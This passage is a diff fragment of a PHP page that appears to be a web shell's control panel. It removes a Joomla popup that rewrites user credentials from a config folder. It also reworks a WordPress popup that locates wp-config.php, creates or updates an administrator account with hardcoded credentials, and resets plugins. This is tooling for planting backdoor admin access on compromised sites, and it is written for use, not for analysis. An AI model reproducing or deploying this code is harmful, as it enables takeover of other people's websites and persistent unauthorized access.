+                        echo '<p style="color: #ccc; font-size: 14px; margin-top: 10px;">';
+                        echo 'Login URL: ' . htmlspecialchars($result['login_url']);
+                        echo '</p>';
+                    }
+                    
+                    if (isset($result['wp_config_path'])) {
+                        echo '<p style="color: #ccc; font-size: 12px; margin-top: 15px;">';
+                        echo 'Detected wp-config.php at: ' . htmlspecialchars($result['wp_config_path']);
+                        echo '</p>';
+                    }
+                    
+                    echo '</div>';
+                }
+                
+                // Clear session
+                unset($_SESSION['wp_edit_results']);
             }
             ?>
             <div style="text-align: center; margin-top: 15px;">
@@ -1658,42 +1585,29 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && !$isPostAction) {
         </div>
     </div>
 
-    <!-- Edit User Popup (Joomla) -->
-    <div id="edituserPopup" class="popup-overlay">
-        <div class="popup-content">
-            <div id="edituserContent">
-                <h3>Auto Edit User Config (Joomla)</h3>
-                <p>Config Directory:</p>
-                <input type="text" id="config_dir" value="<?php echo $currentDir; ?>">
-                <p>New Username:</p>
-                <input type="text" id="user_baru" value="RBP" placeholder="New Username">
-                <p>New Password:</p>
-                <input type="text" id="pass_baru" value="RBP690" placeholder="New Password">
-                <div style="text-align: center; margin-top: 15px;">
-                    <button onclick="RBPsubmitEditUser()" class="tool-button">Edit User</button>
-                    <button onclick="RBPclosePopup('edituserPopup')" class="tool-button">Cancel</button>
-                </div>
-                <p><small>Note: This tool works when run inside a config folder</small></p>
-            </div>
-        </div>
-    </div>
-
     <!-- WordPress Edit User Popup -->
     <div id="wpedituserPopup" class="popup-overlay">
         <div class="popup-content">
             <div id="wpedituserContent">
                 <h3>WordPress User Editor</h3>
-                <p>WordPress Config Path:</p>
-                <input type="text" id="wp_config_path" value="<?php echo $currentDir; ?>/wp-config.php">
-                <p>New Username:</p>
-                <input type="text" id="wp_user_baru" value="audywebmuchy@112" placeholder="New Username">
-                <p>New Password:</p>
-                <input type="text" id="wp_pass_baru" value="audywebmuchy@112" placeholder="New Password">
+                <p>This will automatically:</p>
+                <ul style="text-align: left; margin: 15px 0; padding-left: 20px;">
+                    <li>Find WordPress installation</li>
+                    <li>Create/update admin user</li>
+                    <li>Set default credentials</li>
+                    <li>Reset active plugins</li>
+                    <li>Restore clean WordPress</li>
+                </ul>
+                <p><strong>Default Credentials:</strong></p>
+                <p style="background: #2a2a2a; padding: 10px; border-radius: 5px; border: 1px solid #444;">
+                    Username: <strong>ReaperBythe222@</strong><br>
+                    Password: <strong>ReaperBythe222@</strong>
+                </p>
                 <div style="text-align: center; margin-top: 15px;">
-                    <button onclick="RBPsubmitWPEditUser()" class="tool-button">Edit WordPress User</button>
+                    <button onclick="RBPsubmitWPEditUser()" class="tool-button" style="background: #4CAF50; border-color: #4CAF50;">Edit WordPress User</button>
                     <button onclick="RBPclosePopup('wpedituserPopup')" class="tool-button">Cancel</button>
                 </div>
-                <p><small>Note: This will create an administrator user or update existing one</small></p>
+                <p><small>Note: This will scan for wp-config.php and create administrator access</small></p>
             </div>
         </div>
     </div>
